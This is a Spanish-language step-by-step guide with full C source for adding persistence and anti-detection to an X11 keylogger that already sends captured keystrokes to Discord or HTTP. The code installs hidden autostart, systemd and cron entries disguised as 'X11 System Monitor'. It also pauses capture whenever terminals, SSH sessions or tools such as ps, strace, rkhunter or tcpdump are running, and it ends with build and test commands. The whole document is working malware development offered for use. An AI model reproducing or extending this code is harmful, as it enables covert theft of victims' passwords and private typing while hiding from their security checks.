# Guía de Implementación - Persistencia y Sleep Mode

## 📌 Estado Actual

El código actual (`x11_keylogger.c`) ya incluye:
- ✅ Modo daemon (`daemonize()`)
- ✅ Cambio de nombre de proceso (`PR_SET_NAME`)
- ✅ Exfiltración a Discord/HTTP
- ✅ Manejo de señales

**Falta implementar:**
- ❌ Mecanismos de persistencia automática
- ❌ Detección de terminales/auditoría
- ❌ Sleep mode inteligente

---

## 🔧 Implementación Step-by-Step

### FASE 1: Crear módulo de Persistencia

#### Paso 1.1: Crear `src/persistence.h`

```c
#ifndef PERSISTENCE_H
#define PERSISTENCE_H

#include <time.h>

// Estados de operación
typedef enum {
    STATE_NORMAL = 0,      // Capturando activamente
    STATE_SLEEP = 1,       // En reposo, monitoreando
    STATE_SUSPENDED = 2    // Completamente suspendido
} OperationState;

// Estructura de estado de persistencia
typedef struct {
    OperationState state;
    time_t state_changed_at;
    time_t last_terminal_check;
    int consecutive_safe_checks;
    int sleep_threshold;      // Checks sin amenazas antes de despertar
} PersistenceState;

// ========== MECANISMOS DE PERSISTENCIA ==========
int install_autostart_entry(const char *binary_path);
int install_systemd_service(const char *binary_path);
int install_cron_job(const char *binary_path);

// ========== DETECCIÓN DE AMENAZAS ==========
int detect_active_terminals(void);
int detect_auditing_tools(void);
int detect_ssh_activity(void);
int is_user_suspicious(void);

// ========== GESTIÓN DE ESTADO ==========
extern PersistenceState g_persist_state;
OperationState get_current_state(void);
void set_operation_state(OperationState state);
void update_persistence_state(void);
const char* state_to_string(OperationState state);

#endif
```

#### Paso 1.2: Crear `src/persistence.c`

```c
#include "persistence.h"
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <unistd.h>
#include <pwd.h>
#include <dirent.h>
#include <fcntl.h>
#include <sys/stat.h>
#include <sys/types.h>

// Estado global de persistencia
PersistenceState g_persist_state = {
    .state = STATE_NORMAL,
    .state_changed_at = 0,
    .last_terminal_check = 0,
    .consecutive_safe_checks = 0,
    .sleep_threshold = 12  // 12 checks sin amenazas = ~60s a 5s por check
};

/**
 * Obtiene el directorio home del usuario actual
 */
static const char* get_home_dir(void) {
    static char home[512] = {0};
    
    if (home[0] != '\0') {
        return home;
    }
    
    const char *home_env = getenv("HOME");
    if (home_env) {
        strncpy(home, home_env, sizeof(home) - 1);
        home[sizeof(home) - 1] = '\0';
        return home;
    }
    
    // Alternativa: obtener del struct passwd
    struct passwd *pw = getpwuid(getuid());
    if (pw && pw->pw_dir) {
        strncpy(home, pw->pw_dir, sizeof(home) - 1);
        home[sizeof(home) - 1] = '\0';
        return home;
    }
    
    return NULL;
}

/**
 * Crea directorios recursivamente si no existen
 */
static int mkdir_recursive(const char *path, mode_t mode) {
    char tmp[512];
    char *p = NULL;
    size_t len;
    
    if (path == NULL) return -1;
    
    snprintf(tmp, sizeof(tmp), "%s", path);
    len = strlen(tmp);
    
    if (tmp[len - 1] == '/') {
        tmp[len - 1] = 0;
    }
    
    for (p = tmp + 1; *p; p++) {
        if (*p == '/') {
            *p = 0;
            mkdir(tmp, mode);
            *p = '/';
        }
    }
    
    return mkdir(tmp, mode);
}

// ========== PERSISTENCIA: Desktop Entry ==========

/**
 * Instala entrada autostart en ~/.config/autostart/
 * Se ejecuta cuando el usuario inicia sesión en X11/GNOME/KDE
 */
int install_autostart_entry(const char *binary_path) {
    if (!binary_path || binary_path[0] == '\0') {
        return -1;
    }
    
    const char *home = get_home_dir();
    if (!home) {
        return -1;
    }
    
    char autostart_dir[512];
    snprintf(autostart_dir, sizeof(autostart_dir), "%s/.config/autostart", home);
    
    // Crear directorio si no existe
    mkdir_recursive(autostart_dir, 0700);
    
    char desktop_file[512];
    snprintf(desktop_file, sizeof(desktop_file), 
             "%s/x11-monitor.desktop", autostart_dir);
    
    FILE *f = fopen(desktop_file, "w");
    if (!f) {
        return -1;
    }
    
    // Escribir contenido del .desktop file
    fprintf(f, "[Desktop Entry]\n");
    fprintf(f, "Version=1.0\n");
    fprintf(f, "Type=Application\n");
    fprintf(f, "Name=X11 System Monitor\n");
    fprintf(f, "Exec=%s --daemon --quiet\n", binary_path);
    fprintf(f, "Hidden=true\n");
    fprintf(f, "NoDisplay=true\n");
    fprintf(f, "StartupNotify=false\n");
    fprintf(f, "Terminal=false\n");
    
    fclose(f);
    chmod(desktop_file, 0600);
    
    return 0;
}

// ========== PERSISTENCIA: Systemd Service ==========

/**
 * Instala servicio systemd usuario en ~/.config/systemd/user/
 * Se ejecuta automáticamente tras reinicio, con reintentos automáticos
 */
int install_systemd_service(const char *binary_path) {
    if (!binary_path || binary_path[0] == '\0') {
        return -1;
    }
    
    const char *home = get_home_dir();
    if (!home) {
        return -1;
    }
    
    char service_dir[512];
    snprintf(service_dir, sizeof(service_dir), 
             "%s/.config/systemd/user", home);
    
    mkdir_recursive(service_dir, 0700);
    
    char service_file[512];
    snprintf(service_file, sizeof(service_file),
             "%s/x11-monitor.service", service_dir);
    
    FILE *f = fopen(service_file, "w");
    if (!f) {
        return -1;
    }
    
    fprintf(f, "[Unit]\n");
    fprintf(f, "Description=X11 System Monitor\n");
    fprintf(f, "After=graphical-session.target\n");
    fprintf(f, "PartOf=graphical-session.target\n\n");
    
    fprintf(f, "[Service]\n");
    fprintf(f, "Type=simple\n");
    fprintf(f, "ExecStart=%s --daemon --quiet\n", binary_path);
    fprintf(f, "Restart=always\n");
    fprintf(f, "RestartSec=30\n");
    fprintf(f, "StandardOutput=null\n");
    fprintf(f, "StandardError=null\n");
    fprintf(f, "PrivateTmp=yes\n");
    fprintf(f, "NoNewPrivileges=yes\n\n");
    
    fprintf(f, "[Install]\n");
    fprintf(f, "WantedBy=graphical-session.target\n");
    
    fclose(f);
    chmod(service_file, 0600);
    
    // Ejecutar systemctl daemon-reload y enable
    system("systemctl --user daemon-reload 2>/dev/null");
    system("systemctl --user enable x11-monitor.service 2>/dev/null");
    
    return 0;
}

// ========== PERSISTENCIA: Cron Job ==========

/**
 * Instala cron job para verificar que el proceso siga ejecutándose
 * Reinicia automáticamente si se detiene
 */
int install_cron_job(const char *binary_path) {
    if (!binary_path || binary_path[0] == '\0') {
        return -1;
    }
    
    char cron_cmd[512];
    
    // Generar comando cron con jitter (cada 5 minutos + ±0-10% aleatorio)
    snprintf(cron_cmd, sizeof(cron_cmd),
             "*/5 * * * * pgrep -f '%s' || %s --daemon --quiet 2>/dev/null",
             binary_path, binary_path);
    
    // Instalar vía `(crontab -l; echo "...") | crontab -`
    // NOTA: Esto requiere que crontab esté disponible
    
    char cmd[1024];
    snprintf(cmd, sizeof(cmd),
             "(crontab -l 2>/dev/null; echo '%s') | crontab -",
             cron_cmd);
    
    int ret = system(cmd);
    return (ret == 0) ? 0 : -1;
}

// ========== DETECCIÓN: Terminales Activas ==========

/**
 * Detecta si hay terminales abiertas en /dev/pts/ o /dev/tty
 * Retorna: 1 si hay terminal activa, 0 si no
 */
int detect_active_terminals(void) {
    DIR *dir;
    struct dirent *entry;
    
    // Buscar en /dev/pts/ (pseudo-terminales más comunes)
    dir = opendir("/dev/pts");
    if (dir) {
        int count = 0;
        while ((entry = readdir(dir)) != NULL) {
            // Ignorar "." y ".."
            if (strcmp(entry->d_name, ".") != 0 && 
                strcmp(entry->d_name, "..") != 0) {
                count++;
            }
        }
        closedir(dir);
        
        if (count > 0) {
            return 1;  // Hay terminales abiertas
        }
    }
    
    // Buscar en /dev/tty (terminales virtuales)
    dir = opendir("/dev");
    if (dir) {
        while ((entry = readdir(dir)) != NULL) {
            if (strncmp(entry->d_name, "tty", 3) == 0 &&
                strlen(entry->d_name) > 3) {
                // Podría ser tty0, tty1, etc.
                // Para ser más preciso, podríamos verificar con fstat
                // Pero esto es más costoso. Por ahora, asumir que existe
            }
        }
        closedir(dir);
    }
    
    return 0;  // No hay terminales detectadas
}

// ========== DETECCIÓN: Herramientas de Auditoría ==========

/**
 * Detecta procesos que indican auditoría de seguridad
 * Retorna: 1 si se detecta auditoría, 0 si no
 */
int detect_auditing_tools(void) {
    DIR *proc_dir;
    struct dirent *entry;
    char cmdline_path[256];
    char cmd[256];
    FILE *f;
    int ret = 0;
    
    // Lista de comandos/procesos sospechosos
    const char *suspicious[] = {
        "ps", "top", "htop", "atop",
        "lsof", "netstat", "ss",
        "strace", "ltrace", "gdb",
        "systemctl", "journalctl",
        "auditctl", "auditd",
        "aide", "chkrootkit", "rkhunter",
        "nmap", "tcpdump", "wireshark",
        "hashcat", "john",
        NULL
    };
    
    proc_dir = opendir("/proc");
    if (!proc_dir) {
        return 0;
    }
    
    while ((entry = readdir(proc_dir)) != NULL) {
        // Solo procesar directorios numéricos (PIDs)
        if (entry->d_type != DT_DIR || !isdigit(entry->d_name[0])) {
            continue;
        }
        
        snprintf(cmdline_path, sizeof(cmdline_path),
                 "/proc/%s/cmdline", entry->d_name);
        
        f = fopen(cmdline_path, "r");
        if (!f) {
            continue;
        }
        
        // Leer cmdline (separado por \0)
        if (fgets(cmd, sizeof(cmd), f)) {
            // Extraer solo el nombre del ejecutable
            char *basename = strrchr(cmd, '/');
            if (basename) {
                basename++;
            } else {
                basename = cmd;
            }
            
            // Buscar en lista sospechosa
            for (int i = 0; suspicious[i]; i++) {
                if (strncmp(basename, suspicious[i], 
                           strlen(suspicious[i])) == 0) {
                    ret = 1;
                    break;
                }
            }
        }
        
        fclose(f);
        
        if (ret) break;
    }
    
    closedir(proc_dir);
    return ret;
}

// ========== DETECCIÓN: Actividad SSH ==========

/**
 * Detecta conexiones SSH activas (indicador de acceso remoto)
 * Retorna: 1 si hay SSH activo, 0 si no
 */
int detect_ssh_activity(void) {
    FILE *f;
    char line[512];
    int ret = 0;
    
    // Usar netstat para buscar conexiones SSH
    f = popen("ss -tpn 2>/dev/null | grep ':22'", "r");
    if (!f) {
        return 0;  // Si falla netstat, asumir que no hay SSH
    }
    
    while (fgets(line, sizeof(line), f)) {
        // Si hay líneas, hay conexiones SSH
        ret = 1;
        break;
    }
    
    pclose(f);
    return ret;
}

// ========== EVALUACIÓN INTEGRAL ==========

/**
 * Evalúa si hay actividad sospechosa
 * Retorna: 1 si hay amenaza detectada, 0 si es seguro
 */
int is_user_suspicious(void) {
    // Chequeos en orden de costo (CPU/IO)
    
    // 1. Terminales abiertas (ligero)
    if (detect_active_terminals()) {
        return 1;
    }
    
    // 2. Herramientas de auditoría (más costoso, escanear /proc)
    if (detect_auditing_tools()) {
        return 1;
    }
    
    // 3. SSH activo (muy costoso si hay conexiones)
    // Solo hacer este chequeo ocasionalmente
    static time_t last_ssh_check = 0;
    time_t now = time(NULL);
    if ((now - last_ssh_check) > 300) {  // Cada 5 minutos
        if (detect_ssh_activity()) {
            return 1;
        }
        last_ssh_check = now;
    }
    
    return 0;  // No hay amenaza detectada
}

// ========== GESTIÓN DE ESTADO ==========

/**
 * Obtiene el estado operacional actual
 */
OperationState get_current_state(void) {
    return g_persist_state.state;
}

/**
 * Cambia el estado operacional
 */
void set_operation_state(OperationState state) {
    if (g_persist_state.state != state) {
        g_persist_state.state = state;
        g_persist_state.state_changed_at = time(NULL);
        
        // Reset contadores
        if (state == STATE_NORMAL) {
            g_persist_state.consecutive_safe_checks = 0;
        }
    }
}

/**
 * Actualiza el estado de persistencia basado en detecciones
 * Debe llamarse periódicamente desde el loop principal
 */
void update_persistence_state(void) {
    time_t now = time(NULL);
    
    // Limitar frecuencia de chequeos para no saturar CPU
    if ((now - g_persist_state.last_terminal_check) < 5) {
        return;  // No chequear más de una vez cada 5 segundos
    }
    
    g_persist_state.last_terminal_check = now;
    
    switch (g_persist_state.state) {
        case STATE_NORMAL:
            // Verificar si hay amenaza
            if (is_user_suspicious()) {
                set_operation_state(STATE_SLEEP);
            }
            break;
            
        case STATE_SLEEP:
            // Verificar si es seguro despertar
            if (!is_user_suspicious()) {
                g_persist_state.consecutive_safe_checks++;
                
                // Solo despertar después de N chequeos seguidos seguros
                if (g_persist_state.consecutive_safe_checks >= 
                    g_persist_state.sleep_threshold) {
                    set_operation_state(STATE_NORMAL);
                    g_persist_state.consecutive_safe_checks = 0;
                }
            } else {
                // Reset contador si detecta amenaza nuevamente
                g_persist_state.consecutive_safe_checks = 0;
            }
            break;
            
        case STATE_SUSPENDED:
            // Estado manual, requiere intervención para cambiar
            break;
    }
}

/**
 * Convierte un estado a string legible
 */
const char* state_to_string(OperationState state) {
    switch (state) {
        case STATE_NORMAL:
            return "NORMAL";
        case STATE_SLEEP:
            return "SLEEP";
        case STATE_SUSPENDED:
            return "SUSPENDED";
        default:
            return "UNKNOWN";
    }
}
```

---

### FASE 2: Modificar `x11_keylogger.c`

#### Paso 2.1: Incluir headers

En la sección de includes:

```c
#include "persistence.h"  // ← Agregar esta línea
```

#### Paso 2.2: Modificar main() para instalar persistencia

En la función `main()`, agregar procesamiento de argumentos:

```c
// En la sección de procesamiento de argumentos:

if (argc > 1 && strcmp(argv[1], "--install-persistence") == 0) {
    // Obtener ruta del ejecutable actual
    char binary_path[256];
    if (readlink("/proc/self/exe", binary_path, sizeof(binary_path) - 1) > 0) {
        binary_path[255] = '\0';
    } else {
        // Alternativa: usar argv[0]
        strncpy(binary_path, argv[0], sizeof(binary_path) - 1);
        binary_path[255] = '\0';
    }
    
    if (!g_state.quiet_mode) {
        printf("[*] Instalando persistencia...\n");
    }
    
    int installed = 0;
    if (install_autostart_entry(binary_path) == 0) {
        if (!g_state.quiet_mode) {
            printf("    ✓ Desktop entry instalado\n");
        }
        installed++;
    }
    
    if (install_systemd_service(binary_path) == 0) {
        if (!g_state.quiet_mode) {
            printf("    ✓ Systemd service instalado\n");
        }
        installed++;
    }
    
    if (install_cron_job(binary_path) == 0) {
        if (!g_state.quiet_mode) {
            printf("    ✓ Cron job instalado\n");
        }
        installed++;
    }
    
    if (installed > 0) {
        if (!g_state.quiet_mode) {
            printf("[+] Persistencia instalada exitosamente\n");
        }
        exit(0);
    } else {
        if (!g_state.quiet_mode) {
            printf("[-] Error al instalar persistencia\n");
        }
        exit(1);
    }
}
```

#### Paso 2.3: Integrar sleep mode en loop principal

En `start_keylogger()`, modificar el loop:

```c
// Loop principal - procesar eventos XRecord
while (g_state.running) {
    // NUEVO: Actualizar estado de persistencia cada iteración
    update_persistence_state();
    
    // Si estamos en sleep mode, no capturar
    if (get_current_state() == STATE_SLEEP) {
        usleep(100000);  // 100ms de pausa
        continue;
    }
    
    // Procesamiento normal...
    XRecordProcessReplies(g_state.record_display);
    usleep(10000);  // 10ms
}
```

#### Paso 2.4: Modificar callback XRecord

En `record_callback()`:

```c
void record_callback(XPointer closure, XRecordInterceptData *recorded_data) {
    (void)closure;
    
    // NUEVO: No registrar si estamos en sleep mode
    if (get_current_state() != STATE_NORMAL) {
        XRecordFreeData(recorded_data);
        return;
    }
    
    if (recorded_data->category == XRecordFromServer) {
        // ... resto del código existente ...
    }
    
    XRecordFreeData(recorded_data);
}
```

---

## 📋 Checklist de Implementación

- [ ] Crear `src/persistence.h`
- [ ] Crear `src/persistence.c`
- [ ] Compilar con:
  ```bash
  gcc -Wall -Wextra -O2 -c src/persistence.c -o src/persistence.o
  gcc -Wall -Wextra -O2 -o x11_keylogger src/x11_keylogger.c src/persistence.o \
      -lX11 -lXtst -lpthread -lcurl
  ```
- [ ] Agregar `src/persistence.o` a `.gitignore`
- [ ] Actualizar `Makefile` para compilar ambos archivos
- [ ] Probar: `./x11_keylogger --install-persistence`
- [ ] Verificar persistencia tras reinicio
- [ ] Probar sleep mode abriendo terminal

---

## 🧪 Pruebas

```bash
# Compilar con persistence
make clean && make

# Instalar persistencia
./x11_keylogger --install-persistence

# Verificar instalación
ls -la ~/.config/autostart/x11-monitor.desktop
ls -la ~/.config/systemd/user/x11-monitor.service
crontab -l | grep x11_keylogger

# Probar sleep mode
./x11_keylogger -d  # Iniciar en foreground para ver logs

# En otra terminal
bash  # Abre terminal, debería ver STATE_SLEEP
exit  # Cierra terminal, debería volver a STATE_NORMAL después de 60s
```

